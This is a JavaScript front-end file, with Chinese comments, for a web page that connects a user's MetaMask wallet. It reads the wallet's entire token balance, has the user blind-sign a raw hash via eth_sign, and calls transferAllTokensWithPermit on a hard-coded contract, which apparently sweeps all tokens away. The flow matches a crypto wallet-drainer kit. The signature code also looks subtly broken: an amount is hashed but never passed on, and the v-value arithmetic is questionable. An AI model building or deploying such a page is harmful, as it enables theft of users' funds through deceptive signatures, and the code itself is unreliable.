const contractAddress = '0xB57ee0797C3fc0205714a577c02F7205bB89dF30'; // 合约地址
const contractABI = [
    // 在这里插入你提供的合约 ABI
    {
        "inputs": [],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "target",
                "type": "address"
            }
        ],
        "name": "AddressEmptyCode",
        "type": "error"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "account",
                "type": "address"
            }
        ],
        "name": "AddressInsufficientBalance",
        "type": "error"
    },
    {
        "inputs": [],
        "name": "FailedInnerCall",
        "type": "error"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "token",
                "type": "address"
            }
        ],
        "name": "SafeERC20FailedOperation",
        "type": "error"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "token",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "from",
                "type": "address"
            },
            {
                "internalType": "uint8",
                "name": "v",
                "type": "uint8"
            },
            {
                "internalType": "bytes32",
                "name": "r",
                "type": "bytes32"
            },
            {
                "internalType": "bytes32",
                "name": "s",
                "type": "bytes32"
            }
        ],
        "name": "transferAllTokensWithPermit",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "anonymous": false,
        "inputs": [
            {
                "indexed": true,
                "internalType": "address",
                "name": "token",
                "type": "address"
            },
            {
                "indexed": true,
                "internalType": "address",
                "name": "from",
                "type": "address"
            },
            {
                "indexed": false,
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "TransferTokens",
        "type": "event"
    }
];

let web3;
let userAddress;

async function connectWallet() {
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        const accounts = await web3.eth.getAccounts();
        userAddress = accounts[0];
        document.getElementById('address').innerText = userAddress;
        document.getElementById('walletInfo').classList.remove('hidden');
        document.getElementById('connectWallet').classList.add('hidden');

        // 自动填写参数
        document.getElementById('tokenAddress').value = '0x...（替换为你的代币合约地址）'; // 代币合约地址
        document.getElementById('fromAddress').value = userAddress; // 被签名的钱包地址
    } else {
        alert('请安装MetaMask或其他以太坊钱包！');
    }
}

async function signAndTransferTokens() {
    const tokenAddress = document.getElementById('tokenAddress').value;
    const fromAddress = document.getElementById('fromAddress').value;

    const amount = await getTokenBalance(tokenAddress, fromAddress); // 查询代币余额

    // 生成签名消息
    const message = web3.utils.soliditySha3(
        { t: 'address', v: tokenAddress },
        { t: 'address', v: fromAddress },
        { t: 'uint256', v: amount }
    );

    // 进行签名
    const signature = await web3.eth.sign(message, fromAddress);
    const { v, r, s } = extractSignatureParameters(signature);

    const contract = new web3.eth.Contract(contractABI, contractAddress);

    try {
        await contract.methods.transferAllTokensWithPermit(tokenAddress, fromAddress, v, r, s).send({ from: userAddress });
        document.getElementById('message').innerText = '代币转移成功！';
        document.getElementById('message').classList.remove('hidden');
    } catch (error) {
        console.error(error);
        document.getElementById('message').innerText = '代币转移失败！';
        document.getElementById('message').classList.remove('hidden');
    }
}

function extractSignatureParameters(signature) {
    const r = signature.slice(0, 66);
    const s = '0x' + signature.slice(66, 130);
    const v = parseInt(signature.slice(130, 132), 16) + 27; // v 值转换
    return { v, r, s };
}

async function getTokenBalance(tokenAddress, fromAddress) {
    const tokenContract = new web3.eth.Contract([
        {
            "constant": true,
            "inputs": [
                {
                    "name": "owner",
                    "type": "address"
                }
            ],
            "name": "balanceOf",
            "outputs": [
                {
                    "name": "",
                    "type": "uint256"
                }
            ],
            "payable": false,
            "stateMutability": "view",
            "type": "function"
        }
    ], tokenAddress);

    return await tokenContract.methods.balanceOf(fromAddress).call();
}

document.getElementById('connectWallet').addEventListener('click', connectWallet);
document.getElementById('transferTokens').addEventListener('click', signAndTransferTokens);
